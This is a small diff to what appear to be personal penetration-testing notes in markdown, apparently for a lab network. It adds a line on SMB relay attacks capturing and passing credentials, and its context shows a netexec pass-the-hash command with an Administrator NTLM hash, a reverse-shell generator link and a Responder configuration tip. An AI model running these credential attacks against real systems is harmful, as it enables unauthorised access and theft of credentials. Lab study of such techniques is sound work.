@@ -172,6 +172,7 @@ netexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
 ```
 
 #### relay attack 
+- will capture credintials and pass it using techniques like `PtH` to another systems 
 - [revshells](https://www.revshells.com/)
 ```shell
 #  we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).
